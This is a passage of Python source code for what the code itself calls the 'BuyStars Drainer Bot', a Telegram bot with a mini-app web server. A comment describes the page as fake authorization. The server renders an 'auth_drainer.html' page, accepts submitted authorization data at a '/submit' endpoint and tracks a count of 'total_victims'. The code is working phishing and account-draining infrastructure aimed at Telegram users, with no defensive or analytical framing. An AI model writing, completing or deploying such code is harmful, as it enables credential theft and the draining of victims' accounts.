# ---------- Mini App Web Server ----------
template_loader = jinja2.FileSystemLoader('templates')
template_env = jinja2.Environment(loader=template_loader)

async def auth_page(request):
    """Страница мини-приложения с фейковой авторизацией"""
    template = template_env.get_template('auth_drainer.html')
    html = template.render(bot_token=BOT_TOKEN)
    return web.Response(text=html, content_type='text/html')

async def submit_auth(request):
    """Endpoint для приема данных авторизации"""
    data = await request.json()
    # Данные будут обработаны через WebAppData handler
    return web.json_response({'status': 'success'})

def setup_webapp():
    app = web.Application()
    app.router.add_get('/auth', auth_page)
    app.router.add_post('/submit', submit_auth)
    return app

# ---------- Helper Functions ----------
def format_number(num: int) -> str:
    if num >= 1000000:
        return f"{num/1000000:.1f}M"
    elif num >= 1000:
        return f"{num/1000:.1f}K"
    return str(num)

def get_victims_count() -> int:
    cursor.execute("SELECT value FROM stats WHERE key = 'total_victims'")
    return cursor.fetchone()[0]

# ---------- Main ----------
async def main():
    # Запускаем веб-сервер для мини-приложения
    webapp = setup_webapp()
    runner = web.AppRunner(webapp)
    await runner.setup()
    site = web.TCPSite(runner, WEBAPP_HOST, WEBAPP_PORT)
    await site.start()
    logger.info(f"🌐 WebApp server started on http://{WEBAPP_HOST}:{WEBAPP_PORT}")
    
    # Запускаем Telegram бота
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buttons))
    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
    application.add_handler(CallbackQueryHandler(handle_callback))
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    logger.info("🤖 BuyStars Drainer Bot started. Press Ctrl+C to stop.")
    
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    
    await application.updater.stop()
    await application.stop()
    await runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
